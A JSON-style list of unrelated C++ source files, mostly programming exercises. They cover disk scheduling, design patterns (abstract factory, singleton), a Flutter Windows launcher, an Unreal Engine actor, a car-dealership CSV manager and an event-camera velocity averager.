    "#include \"eventail_simulation/linear_averagor.hpp\"\n\nnamespace eventail_simulation {\n\nLinearAveragor::LinearAveragor(const double uncertainty_level, const ErrorMetric& metric_type,\n                               const ErrorModel& model_type, const SvdFunction& svd_type)\n    : uncertainty_level_(uncertainty_level),\n      error_metric_type_(metric_type),\n      error_model_type_(model_type),\n      svd_type_(svd_type){};\n\nvoid LinearAveragor::reset() {\n  success_ = false;\n  vc_gt_.setZero();\n  vc_est_.setZero();\n  solutions_.clear();\n}\n\nvoid LinearAveragor::inputGroundTruth(const Velocity& vc) { vc_gt_ = vc; }\n\nvoid LinearAveragor::addData(const FullLinearSolution& solution) {\n  if (solution.second.determinant() >= uncertainty_level_) solutions_.emplace_back(solution);\n}\n\nbool LinearAveragor::runAveragor(bool use_uncertainty) {\n  if (solutions_.size() < 2) {\n    EVENTAIL_WARN(\"Less than two eventails have been added to the Averagor! Rank deficient!\");\n    vc_est_ = Velocity::Zero();\n    return false;\n  }\n\n  MatrixXd D = MatrixXd::Zero(solutions_.size(), 3);\n  for (size_t idx = 0; idx < solutions_.size(); ++idx) {\n    Basis e2 = solutions_[idx].first.col(1);\n    Basis e3 = solutions_[idx].first.col(2);\n    double uy = solutions_[idx].first.col(3)[1];\n    double uz = solutions_[idx].first.col(3)[2];\n    D.row(idx) = uz * e2.transpose() - uy * e3.transpose();\n  }\n\n  if (D.rows() == 2 || svd_type_ == SvdFunction::SVD)\n    vc_est_ = svd(D);\n  else  // ! default choice (SvdFunction::PCA)\n    vc_est_ = standardizedSvd(D);\n  success_ = true;\n  return true;\n}\n\nVelocity LinearAveragor::getEstimation() const {\n  if (!success_) {\n    EVENTAIL_WARN(\"Averagor has not produced reliable solution yet. Output zero velocity instead!\");\n    return Velocity::Zero();\n  } else\n    return vc_est_;\n}\n\ndouble LinearAveragor::getDirectionError() const {\n  if (!success_) {\n    EVENTAIL_WARN(\"Averagor has not produced reliable solution yet. Output -1 instead!\");\n    return -1.0;\n  }\n\n  Velocity norm_vc_gt = vc_gt_, norm_vc_est = vc_est_;\n  norm_vc_gt.normalize();\n  norm_vc_est.normalize();\n  double theta = safe_acos_deg(norm_vc_gt.dot(norm_vc_est));\n  return min(abs(theta), abs(180.0 - theta));  // ! to skip confirmation on solution duality\n}\n\ndouble LinearAveragor::getEuclideanDistance() const {\n  if (!success_) {\n    EVENTAIL_WARN(\"Averagor has not produced reliable solution yet. Output -1 instead!\");\n    return -1.0;\n  }\n  Velocity norm_vc_gt = vc_gt_, norm_vc_est = vc_est_;\n  norm_vc_gt.normalize();\n  norm_vc_est.normalize();\n  return (norm_vc_gt - norm_vc_est).squaredNorm();\n}\n\ndouble LinearAveragor::getError() const {\n  if (error_metric_type_ == ErrorMetric::EuclideanDistance)\n    return getEuclideanDistance();\n  else  // ! default choice (ErrorMetric::DirectionError)\n    return getDirectionError();\n}\n\n}  // namespace eventail_simulation\n",
    "#include<iostream>\n#include<vector>\n#include<algorithm>\n#include<climits>\nusing namespace std;\n\nvoid FCFS(vector<int>arr,int head,int range){\n    int sum=0;\n    cout<<\"Disc will be called in order of \"<<endl;\n    for(int i=0;i<arr.size();i++){\n        sum+=abs(head-arr[i]);\n        head=arr[i];\n        cout<<arr[i]<<\" \";\n    }\n    cout<<endl;\n    cout<<\"Total head movement\"<<\": \"<<sum<<endl;\n}\nvoid SSTF(vector<int>arr,int head,int range){\n    int sum=0;\n    cout<<\"Disc will be called in order of \"<<endl;\n    for(int i=0;i<arr.size();i++){\n        int min=INT_MAX,k=0,temp=0;\n        for(int j=0;j<arr.size();j++){\n            temp=abs(head-arr[j]);\n            if(temp<min){\n                min=temp;\n                k=j;\n            }\n        }\n        cout<<arr[k]<<\" \";\n        sum+=min;\n        head=arr[k];\n        arr[k]=INT_MAX;\n    }\n    cout<<endl;\n    cout<<\"Total head movement: \"<<sum<<endl;\n}\nint main(){\nint n;\ncout<<\"enter number of requests: \";\ncin>>n;\nint head;\nint range;\ncout<<\"enter the number of tracks: \";\ncin>>range;\nrange--;\ncout<<\"enter the head position: \";\ncin>>head;\nvector<int>arr;\ncout<<\"enter the requests: \";\nfor(int i=0;i<n;i++){\n    int temp;\n    cin>>temp;\n  arr.push_back(temp);\n}\nint opt;\ncout<<\"1. FCFS\"<<endl;\ncout<<\"2.SSTF\"<<endl;\ncout<<\"enter your option: \";\ncin>>opt;\nif(opt==1){\n    FCFS(arr,head,range);\n}\nelse if(opt==2){\n    SSTF(arr,head,range);\n}\nreturn 0;\n}",
    "\ufeff#include <iostream>\n#include <string>\nusing namespace std;\n\n/*\n\u0410\u0431\u0441\u0442\u0440\u0430\u043a\u0442\u043d\u0430\u044f \u0444\u0430\u0431\u0440\u0438\u043a\u0430 - \u043f\u043e\u0440\u043e\u0436\u0434\u0430\u044e\u0449\u0438\u0439 \u043f\u0430\u0442\u0442\u0435\u0440\u043d \u043f\u0440\u043e\u0435\u043a\u0442\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u044f,\n\u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u043f\u0440\u0435\u0434\u043e\u0441\u0442\u0430\u0432\u043b\u044f\u0435\u0442 \u0438\u043d\u0442\u0435\u0440\u0444\u0435\u0439\u0441 \u0434\u043b\u044f \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044f \u0441\u0435\u043c\u0435\u0439\u0441\u0442\u0432 \u0432\u0437\u0430\u0438\u043c\u043e\u0441\u0432\u044f\u0437\u0430\u043d\u043d\u044b\u0445 \u0438\u043b\u0438 \u0432\u0437\u0430\u0438\u043c\u043e\u0437\u0430\u0432\u0438\u0441\u0438\u043c\u044b\u0445 \u043e\u0431\u044a\u0435\u043a\u0442\u043e\u0432,\n\u043d\u0435 \u0441\u043f\u0435\u0446\u0438\u0444\u0438\u0446\u0438\u0440\u0443\u044f \u0438\u0445 \u043a\u043e\u043d\u043a\u0440\u0435\u0442\u043d\u044b\u0445 \u043a\u043b\u0430\u0441\u0441\u043e\u0432.\n\n\u041f\u0440\u0438\u043c\u0435\u043d\u0438\u043c\u043e\u0441\u0442\u044c\n- \u0441\u0438\u0441\u0442\u0435\u043c\u0430 \u043d\u0435 \u0434\u043e\u043b\u0436\u043d\u0430 \u0437\u0430\u0432\u0438\u0441\u0435\u0442\u044c \u043e\u0442 \u0442\u043e\u0433\u043e, \u043a\u0430\u043a \u0441\u043e\u0437\u0434\u0430\u044e\u0442\u0441\u044f, \u043a\u043e\u043c\u043f\u043e\u043d\u0443\u044e\u0442\u0441\u044f \u0438 \u043f\u0440\u0435\u0434\u0441\u0442\u0430\u0432\u043b\u044f\u044e\u0442\u0441\u044f \u0432\u0445\u043e\u0434\u044f\u0449\u0438\u0435 \u0432 \u043d\u0435\u0435 \u043e\u0431\u044a\u0435\u043a\u0442\u044b;\n- \u0432\u0445\u043e\u0434\u044f\u0449\u0438\u0435 \u0432 \u0441\u0435\u043c\u0435\u0439\u0441\u0442\u0432\u043e \u0432\u0437\u0430\u0438\u043c\u043e\u0441\u0432\u044f\u0437\u0430\u043d\u043d\u044b\u0435 \u043e\u0431\u044a\u0435\u043a\u0442\u044b \u0434\u043e\u043b\u0436\u043d\u044b \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c\u0441\u044f \u0432\u043c\u0435\u0441\u0442\u0435 \u0438 \u043d\u0435\u043e\u0431\u0445\u043e\u0434\u0438\u043c\u043e \u043e\u0431\u0435\u0441\u043f\u0435\u0447\u0438\u0442\u044c \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 \u044d\u0442\u043e\u0433\u043e \u043e\u0433\u0440\u0430\u043d\u0438\u0447\u0435\u043d\u0438\u044f;\n- \u0441\u0438\u0441\u0442\u0435\u043c\u0430 \u0434\u043e\u043b\u0436\u043d\u0430 \u043a\u043e\u043d\u0444\u0438\u0433\u0443\u0440\u0438\u0440\u043e\u0432\u0430\u0442\u044c\u0441\u044f \u043e\u0434\u043d\u0438\u043c \u0438\u0437 \u0441\u0435\u043c\u0435\u0439\u0441\u0442\u0432 \u0441\u043e\u0441\u0442\u0430\u0432\u043b\u044f\u044e\u0449\u0438\u0445 \u0435\u0435 \u043e\u0431\u044a\u0435\u043a\u0442\u043e\u0432;\n\n\u041f\u0430\u0442\u0442\u0435\u0440\u043d \u0430\u0431\u0441\u0442\u0440\u0430\u043a\u0442\u043d\u0430\u044f \u0444\u0430\u0431\u0440\u0438\u043a\u0430 \u043e\u0431\u043b\u0430\u0434\u0430\u0435\u0442 \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0438\u043c\u0438 \u043f\u043b\u044e\u0441\u0430\u043c\u0438 \u0438 \u043c\u0438\u043d\u0443\u0441\u0430\u043c\u0438:\n * \u0438\u0437\u043e\u043b\u0438\u0440\u0443\u0435\u0442 \u043a\u043e\u043d\u043a\u0440\u0435\u0442\u043d\u044b\u0435 \u043a\u043b\u0430\u0441\u0441\u044b.\n * \u0443\u043f\u0440\u043e\u0449\u0430\u0435\u0442 \u0437\u0430\u043c\u0435\u043d\u0443 \u0441\u0435\u043c\u0435\u0439\u0441\u0442\u0432 \u043f\u0440\u043e\u0434\u0443\u043a\u0442\u043e\u0432.\n * \u0433\u0430\u0440\u0430\u043d\u0442\u0438\u0440\u0443\u0435\u0442 \u0441\u043e\u0447\u0435\u0442\u0430\u0435\u043c\u043e\u0441\u0442\u044c \u043f\u0440\u043e\u0434\u0443\u043a\u0442\u043e\u0432.\n*/\n\nclass Herbivore abstract //\u0422\u0440\u0430\u0432\u043e\u044f\u0434\u043d\u043e\u0435 \u0436\u0438\u0432\u043e\u0442\u043d\u043e\u0435 \n{\npublic:\n    virtual string GetName() abstract;\n    virtual void eatGrass() abstract; \n    virtual double GetWeight() abstract;\n    virtual bool IsAlive() abstract;\n    virtual void SetAlive(bool Alive) abstract;\n};\n\nclass Wildebeest : public Herbivore //\u0410\u043d\u0442\u0438\u043b\u043e\u043f\u0430 \u0413\u043d\u0443\n{\n    double weight;\n    bool alive;\npublic:\n    Wildebeest() : weight(200), alive(true) {}\n\n    void eatGrass() override \n    {\n        weight += 10; \n    }\n    double GetWeight() override\n    {\n        return weight;\n    }\n    bool IsAlive() override \n    {\n        return alive;\n    }\n    void SetAlive(bool Alive) override\n    {\n        alive = Alive;\n    }\n    string GetName() override\n    {\n        return \"Wildebeest\";\n    }\n};\n\nclass Bison : public Herbivore //\u0411\u0438\u0437\u043e\u043d\n{\nprivate:\n    double weight;\n    bool alive;\npublic:\n    Bison() : weight(100), alive(true) {}\n\n    void eatGrass() override\n    {\n        weight += 10;\n    }\n    double GetWeight() override\n    {\n        return weight;\n    }\n    bool IsAlive() override \n    {   \n        return alive;\n    }\n    void SetAlive(bool Alive) override\n    {\n        alive = Alive;\n    }\n    string GetName() override\n    {\n        return \"Bison\";\n    }\n};\n\nclass Elk : public Herbivore //\u041b\u043e\u0441\u044c\n{\nprivate:\n    double weight;\n    bool alive;\npublic:\n    Elk() : weight(500), alive(true) {}\n\n    void eatGrass() override\n    {\n        weight += 10;\n    }\n    double GetWeight() override\n    {\n        return weight;\n    }\n    bool IsAlive() override\n    {\n        return alive;\n    }\n    void SetAlive(bool Alive) override\n    {\n        alive = Alive;\n    }\n    string GetName() override\n    {\n        return \"Elk\";\n    }\n};\n\nclass Carnivore abstract //\u041f\u043b\u043e\u0442\u043e\u044f\u0434\u043d\u043e\u0435 \u0436\u0438\u0432\u043e\u0442\u043d\u043e\u0435\n{\npublic:\n    virtual void Eat(Herbivore* obj) abstract;\n    virtual double GetPower() abstract;\n};\n\nclass Lion : public Carnivore\n{   \n    double power;\npublic:\n    double GetPower() override \n    {\n        return power;\n    }\n    void Eat(Herbivore* obj) override\n    {\n        if (power > obj->GetWeight())\n        {\n            power += 10;\n            obj->SetAlive(false);\n            cout << \"Lion eats \" << obj->GetName() << \" and gains power \" << endl;\n        }\n        else \n        {\n            power -= 10;\n            cout << \"Lion fails to eat \" << obj->GetName() << \" and loses power\\n\";\n        }\n    }\n};\n\nclass Wolf : public Carnivore\n{\n    double power;\npublic:\n    double GetPower() override\n    {\n        return power;\n    }\n    void Eat(Herbivore* obj) override\n    {\n        if (power > obj->GetWeight())\n        {\n            power += 10;\n            obj->SetAlive(false);\n            cout << \"Wolf eats \" << obj->GetName() << \" and gains power \" << endl;\n        }\n        else\n        {\n            power -= 10;\n            cout << \"Wolf fails to eat \" << obj->GetName() << \" and loses power\\n\";\n        }\n    }\n};\n\nclass Tiger : public Carnivore\n{\n    double power;\npublic:\n    double GetPower() override\n    {\n        return power;\n    }\n    void Eat(Herbivore* obj) override\n    {\n        if (power > obj->GetWeight())\n        {\n            power += 10;\n            obj->SetAlive(false);\n            cout << \"Tiger eats \" << obj->GetName() << \" and gains power \" << endl;\n        }\n        else\n        {\n            power -= 10;\n            cout << \"Tiger fails to eat \" << obj->GetName() << \" and loses power\\n\";\n        }\n    }\n};\n\nclass Continent abstract\n{\npublic:\n    virtual Herbivore* CreateHerbivore() abstract;\n    virtual Carnivore* CreateCarnivore() abstract;\n};\n\nclass Africa : public Continent\n{\npublic:\n    Herbivore* CreateHerbivore() override\n    {\n        return new Wildebeest;\n    }\n    Carnivore* CreateCarnivore() override\n    {\n        return new Lion;\n    }\n};\n\nclass NorthAmerica : public Continent\n{\n    Herbivore* CreateHerbivore() override\n    {\n        return new Bison;\n    }\n    Carnivore* CreateCarnivore() override\n    {\n        return new Wolf;\n    }\n};\n\nclass Eurasia : public Continent\n{\n    Herbivore* CreateHerbivore() override\n    {\n        return new Elk;\n    }\n    Carnivore* CreateCarnivore() override\n    {\n        return new Tiger;\n    }\n};\n\nclass AnimalWorld\n{\n    Herbivore* herbivore;\n    Carnivore* carnivo",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_signup_ui\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n\nclass Base\n{\nprivate:\n    int value;\n\npublic:\n    Base() : value{0} { std::cout << \"Base no-args constructor\" << std::endl; };\n    Base(int x) : value{x} { std::cout << \"Base (int) overloaded constructor\" << std::endl; };\n\n    ~Base() { std::cout << \"Base destructor\" << std::endl; };\n};\n\nclass Derived : public Base\n{\nprivate:\n    int doubledValue;\n\npublic:\n    Derived() : Base{}, doubledValue{0} { std::cout << \"Derived no-args constructor\" << std::endl; };\n    Derived(int x) : Base{x}, doubledValue{x * 2} { std::cout << \"Derived (int) overloaded constructor\" << std::endl; };\n\n    ~Derived() { std::cout << \"Derived destructor\" << std::endl; };\n};\n\nint main()\n{\n    // Constructors and Destructors with inheritance\n    // Base b;\n    // Base b1(100);\n\n    // Derived d;\n    Derived d1(1000);\n\n    // std::cout << \"Hello, World!\" << std::endl;\n    // // getch(); // needs conio.h\n    // // std::cin.get();\n    // // getc(stdin);\n    // std::cout << \"Hello, World!\" << std::endl;\n    return 0;\n}",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"MyActor.h\"\n\n// Sets default values\nAMyActor::AMyActor()\n{\n \t// Set this actor to call Tick() every frame.  You can turn this off to improve performance if you don't need it.\n\tPrimaryActorTick.bCanEverTick = true;\n\n}\n\n// Called when the game starts or when spawned\nvoid AMyActor::BeginPlay()\n{\n\tSuper::BeginPlay();\n\tStartLocation = GetActorLocation();\n}\n\n// Called every frame\nvoid AMyActor::Tick(float DeltaTime)\n{\n\tSuper::Tick(DeltaTime);\n\tToFroMotion(DeltaTime);\n\tRotator(DeltaTime);\n}\nvoid AMyActor:: Rotator(float DeltaTime){\n\tFRotator CurrentRotation = GetActorRotation();\n\tCurrentRotation += RotationSpeed*DeltaTime;\n\tSetActorRotation(CurrentRotation);\n\tif(!FullRotation){\n\t\tif(CurrentRotation.Euler().Z - StartRotation.Euler().Z > MaxRotation || CurrentRotation.Euler().Z - StartRotation.Euler().Z < -MaxRotation){\n\t\t\tRotationSpeed = FRotator(0,-RotationSpeed.Euler().Z,0);\n\t\t}\n\t}\n}\n\nvoid AMyActor::ToFroMotion(float DeltaTime){\n\tFVector CurrentLocation;\n\tCurrentLocation = GetActorLocation();\n\tCurrentLocation += MovementSpeed*DeltaTime;\n\tSetActorLocation(CurrentLocation);\n\tDistanceMoved = FVector::Dist(StartLocation,CurrentLocation);\n\tif(DistanceMoved >= MoveDistance)\n\t{\n\t\tFVector MoveDirection = MovementSpeed.GetSafeNormal();\n\t\tStartLocation += MoveDistance*MoveDirection;\n\t\tfloat offset = FVector::Dist(StartLocation,GetActorLocation());\n\t\tSetActorLocation(StartLocation);\n\t\tFString S = GetActorNameOrLabel();\n\t\tUE_LOG(LogTemp,Warning,TEXT(\"Log printing  %f : %s\"),offset,*S);\n\t\tMovementSpeed = -MovementSpeed;\n\t}\n}\n\nbool AMyActor::DestinationReached(FVector CurrentLocation) const\n{\n\tfloat DistancekMoved = FVector::Dist(StartLocation,CurrentLocation);\n\treturn DistanceMoved >= MoveDistance;\n}\n\n",
    "#include<iostream>\n#include<fstream>\n#include<string>\n#include<sstream>\nusing namespace std;\n\nstruct carro {\n    int id;\n    string maker;\n    string model;\n    int year;\n    string sold_to;\n    string bought_to;\n    int sold_for;\n    int bought_for;\n    bool vendido;\n    string comprador;\n};\n\nstruct cliente {\n    int id;\n    string first_name;\n    string last_name;\n    string email;\n    int age;\n};\n\n//agregar carros\nvoid aggcarro (ofstream& archivomod){\n    carro newcarro;\n    cout<<\"id del auto (a partir de 1001)\"<<endl;\n    cin>>newcarro.id;\n    cout<<\"Marca del auto\"<<endl;\n    cin>>newcarro.maker;\n    cout<<\"Modelo del auto\"<<endl;\n    cin>>newcarro.model;\n    cout<<\"A\u00f1o del auto\"<<endl;\n    cin>>newcarro.year;\n    cout<<\"Comprado a (age del comprador)\"<<endl;\n    cin>>newcarro.sold_to;\n    cout<<\"Vendido a (age de la persona a la que se le vendio)\"<<endl;\n    cin>>newcarro.bought_to;\n    cout<<\"Precio de venta\"<<endl;\n    cin>>newcarro.sold_for;\n    cout<<\"Precio de compra\"<<endl;\n    cin>>newcarro.bought_for;\n    newcarro.vendido = false;\n    archivomod<<\"\\n\"<<newcarro.id<<\";\"<<newcarro.maker<<\";\"<<newcarro.model<<\";\"<<newcarro.year<<\";\"<<newcarro.sold_to<<\";\"<<newcarro.bought_to<<\";\"<<newcarro.sold_for<<\";\"<<newcarro.bought_for<<endl;\n    cout<<\"Carro agregado con exito\"<<endl;\n}\n//ver lista\nvoid verlistacarros (ifstream& archivoleer){\n    carro carro;\n    cliente cliente;\n    int COMPRADOS = 0;\n    int VENDIDOS = 0;\n\n    cout<<\"Lista de carros:\\n\";\n    while (archivoleer>>carro.id>>carro.maker>>carro.year>>carro.sold_for>>cliente.first_name>>cliente.last_name){\n        if (carro.vendido){\n            cout<<carro.id<<\", \"<<carro.maker<<\", \"<<carro.year<<\", \"<<carro.sold_for<<\".\\n\"<<\"Vendido a:\"<<cliente.first_name<<cliente.last_name<<\".\"<<endl;\n            VENDIDOS++;\n        }\n        else {\n            cout<<carro.id<<\", \"<<carro.maker<<\", \"<<carro.year<<endl;\n            COMPRADOS++;\n        }\n    }\n    cout<<\"\\nCarros comprados: \"<<COMPRADOS<<endl;\n    cout<<\"Carros vendidos: \"<<VENDIDOS<<endl;\n\n}\n//mostrar datos de un vendedor o comprador\nvoid vervendedor(ifstream& archivoclileer) {\n    string idvendedor;\n    cout << \"Ingrese el ID del cliente que desea buscar:\\n\";\n    cin >> idvendedor;\n\n    if (!archivoclileer.is_open()) {\n        cout << \"Error al abrir el archivo de clientes.\" << endl;\n        return ;\n    }\n\n    string linea;\n    while (getline(archivoclileer, linea)) {\n\n        if (linea.substr(0, 4) == idvendedor) {\n            cout << \"Datos del vendedor:\\n\" << linea << endl;\n        }\n    }\n}\n\n//agregar cliente\nvoid aggcliente(ofstream& archivoclimod) {\n    cliente newcliente;\n    cout<<\"id del cliente (a partir de 101)\\n\";\n    cin>>newcliente.id;\n    cout<<\"1er Nombre del cliente\"<<endl;\n    cin>>newcliente.first_name;\n    cout<<\"1er apellido del cliente\"<<endl;\n    cin>>newcliente.last_name;\n    cout<<\"ingrese Correo electronico del cliente\"<<endl;\n    cin>>newcliente.email;\n    cout<<\"Edad del cliente\"<<endl;\n    cin>>newcliente.age;\n    archivoclimod<<\"\\n\"<<newcliente.id<<\";\"<<newcliente.first_name<<\";\"<<newcliente.last_name<<\";\"<<newcliente.email<<\";\"<<newcliente.age<<endl;\n    cout<<\"cliente agregado con exito\"<<endl;\n}\n//comparar perdidas y ganancias\nvoid diferenciasventas(){\n    carro carro;\n    \n}\n\nint main(){\n\n    ofstream archivomod(\"cars_data.csv\", ios::app);//1 agregar carros\n    ifstream archivoleer(\"cars_data.csv\");//2 ver lista de carros\n\n    ofstream archivoclimod(\"clients.csv\", ios::app);\n    ifstream archivoclileer(\"clients.csv\");//3 buscar vendedor\n\n    if (!archivomod.is_open() || !archivoleer.is_open() || !archivoclileer.is_open() || !archivoclimod.is_open()) {\n        cout<<\"Error al abrir el archivo cars_data.csv\"<<endl;\n        return 1;\n    }\n    int opcion;\n    cout<<\"1. Agregar carro\\n2. Mostrar lista de carros\\n3. Mostrar informacion de un cliente\\n4. Agregar un cliente\"<<endl;\n    cin>> opcion;\n\n    switch (opcion){\n        case 1:\n            aggcarro(archivomod);\n            break;\n        case 2:\n            verlistacarros(archivoleer);\n            break;\n        case 3:\n            vervendedor(archivoclileer);\n            break;\n        case 4:\n            aggcliente(archivoclimod);\n            break;\n        default:\n            cout<<\"Error elija otra opcion..\"<<endl;\n            break;\n    }\n\n    archivomod.close();//1\n    archivoleer.close();//2\n    \n    archivoclimod.close();//4\n    archivoclileer.close();//3\n\n    return 0;\n}",
    "#define _CRT_SECURE_NO_WARNINGS\n#include <iostream>\n#include <string>\n#include <time.h>\nusing namespace std;\n\nclass Human\n{\n\t//\u00c8\u00ed\u00e8\u00f6\u00e8\u00e0\u00eb\u00e8\u00e7\u00e0\u00f6\u00e8\u00ff \u00e2 \u00e3\u00eb\u00ee\u00e1\u00e0\u00eb\u00e5 \u00ef\u00ee\u00f1\u00eb\u00e5 \u00ee\u00ef\u00e8\u00f1\u00e0\u00ed\u00e8\u00ff \u00ea\u00eb\u00e0\u00f1\u00f1\u00e0\n\tstatic Human* instance;//\u00c5\u00f1\u00eb\u00e8 \u00f1\u00f2\u00e0\u00f2\u00e8\u00f7\u00e5\u00f1\u00ea\u00ee\u00e5 \u00ef\u00ee\u00eb\u00e5 \u00ea\u00eb\u00e0\u00f1\u00f1 \u00f2\u00e8\u00ef\u00e0 \u00e8\u00ed\u00f2, \u00ec\u00fb \u00ec\u00ee\u00e6\u00e5\u00ec \u00e8\u00ed\u00e8\u00f6\u00e8\u00e0\u00eb\u00e8\u00e7\u00e8\u00f0\u00ee\u00e2\u00e0\u00f2\u00fc \u00e5\u00e5 \u00e2 \u00ea\u00eb\u00e0\u00f1\u00f1\u00e5, \u00e2 \u00ef\u00f0\u00ee\u00f2\u00e8\u00e2\u00ed\u00ee\u00ec \u00f1\u00eb\u00f3\u00f7\u00e0\u00e5 \u00f1\u00f2\u00e0\u00f2\u00e8\u00f7\u00e5\u00f1\u00ea\u00ee\u00e5 \u00ef\u00ee\u00eb\u00e5 \u00e4\u00ee\u00eb\u00e6\u00ed\u00ee \u00e8\u00ed\u00e8\u00f6\u00e8\u00e0\u00eb\u00e8\u00e7\u00e8\u00f0\u00ee\u00e2\u00e0\u00f2\u00fc\u00f1\u00ff \u00e7\u00e0 \u00ef\u00f0\u00e5\u00e4\u00e5\u00eb\u00e0\u00ec\u00e8 \u00ea\u00eb\u00e0\u00f1\u00f1\u00e0.\n\tstring lastName;\n\tstring firstName;\n\ttm birthDate;\n\t//SINGLETON'S CTORS ARE ALWAYS PRIVATE\n\tHuman()\n\t{\n\t\tcout << \"Ctor Human:\\t\" << this << endl;\n\t}\n\tHuman(const Human& obj) = delete;\npublic:\n\tconst std::string& getLastName() const\n\t{\n\t\t//\u00ca\u00ee\u00ed\u00f1\u00f2\u00e0\u00ed\u00f2\u00ed\u00fb\u00e9 \u00ec\u00e5\u00f2\u00ee\u00e4 \u00ed\u00e5 \u00e8\u00e7\u00ec\u00e5\u00ed\u00ff\u00e5\u00f2 this\n\t\t//\u00ca\u00ee\u00ed\u00f1\u00f2\u00e0\u00ed\u00f2\u00ed\u00fb\u00e9 \u00ec\u00e5\u00f2\u00ee\u00e4 \u00ee\u00e1\u00ff\u00e7\u00e0\u00f2\u00e5\u00eb\u00fc\u00ed\u00ee \u00e4\u00ee\u00eb\u00e6\u00e5\u00ed \u00e2\u00ee\u00e7\u00e2\u00f0\u00e0\u00f9\u00e0\u00f2\u00fc \u00ea\u00ee\u00ed\u00f1\u00f2\u00e0\u00ed\u00f2\u00ed\u00ee\u00e5 \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00e5\n\t\treturn lastName;\n\t}\n\tconst std::string& getFirstName() const\n\t{\n\t\treturn firstName;\n\t}\n\tconst tm& getBirthDate() const\n\t{\n\t\treturn birthDate;\n\t}\n\tvoid setLastName(const std::string& lastName)\n\t{\n\t\tthis->lastName = lastName;\n\t}\n\tvoid setFirstName(const std::string& firstName)\n\t{\n\t\tthis->firstName = firstName;\n\t}\n\tvoid setBirthDate(int year, int month, int day)\n\t{\n\t\tthis->birthDate.tm_mday = day;\n\t\tthis->birthDate.tm_year = year - 1900;\n\t\tthis->birthDate.tm_mon = month - 1;\n\t\t/*this->birthDate = birthDate;*/\n\t}\n\t~Human()\n\t{\n\t\tcout << \"Dtor Human:\\t\" << this << endl;\n\t}\n\tstatic Human* getInstance()\n\t{\n\t\tif (instance == nullptr)//\u00ce\u00e1\u00fa\u00e5\u00ea\u00f2 \u00f1\u00ee\u00e7\u00e4\u00e0\u00e5\u00f2\u00f1\u00ff \u00f2\u00ee\u00eb\u00fc\u00ea\u00ee \u00e2 \u00f2\u00ee\u00ec \u00f1\u00eb\u00f3\u00f7\u00e0\u00e5, \u00e5\u00f1\u00eb\u00e8 \u00ee\u00ed \u00e5\u00f9\u00e5 \u00ed\u00e5 \u00f1\u00f3\u00f9\u00e5\u00f1\u00f2\u00e2\u00f3\u00e5\u00f2.\n\t\t{\n\t\t\tinstance = new Human(); \n\t\t}\n\t\treturn instance;\n\t}\n\tvoid print() const\n\t{\n\t\ttime_t timer;\n\t\ttime(&timer);\n\t\ttm* currentTime = localtime(&timer);\n\t\tunsigned int age = currentTime->tm_year - birthDate.tm_year;\n\t\tif (currentTime->tm_yday < birthDate.tm_yday)\n\t\t{\n\t\t\tage--;\n\t\t}\n\t\tcout << firstName << \" \" << lastName << \" \" << age << endl;\n\t}\n};\nHuman* Human::instance = nullptr;//\u00c3\u00eb\u00ee\u00e1\u00e0\u00eb\u00fc\u00ed\u00e0\u00ff \u00f2\u00ee\u00f7\u00ea\u00e0 \u00e4\u00ee\u00f1\u00f2\u00f3\u00ef\u00e0 \u00ea \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2\u00f3 \u00ea\u00eb\u00e0\u00f1\u00f1\u00e0\nvoid main()\n{\n\tsetlocale(LC_ALL, \"\");\n\tHuman* main = Human::getInstance();//\u00d1\u00ee\u00e7\u00e4\u00e0\u00e5\u00ec \u00fd\u00ea\u00e7\u00e5\u00ec\u00ef\u00eb\u00ff\u00f0 \u00ea\u00eb\u00e0\u00f1\u00f1\u00e0, \u00ef\u00ee\u00f2\u00ee\u00ec\u00f3 \u00f7\u00f2\u00ee \u00ee\u00ed \u00e5\u00f9\u00e5 \u00ed\u00e5 \u00f1\u00f3\u00f9\u00e5\u00f1\u00f2\u00e2\u00f3\u00e5\u00f2\n\tmain->setLastName(\"Vercetti\");\n\tmain->setFirstName(\"Tommy\");\n\tmain->setBirthDate(1951, 6, 10);\n\tmain->print();\n\n\t/*Human copy = main;\n\t///*copy.print();*/\n\t//Human* tommy = Human::getInstance();\n\t//tommy->setLastName*/\n}\n",
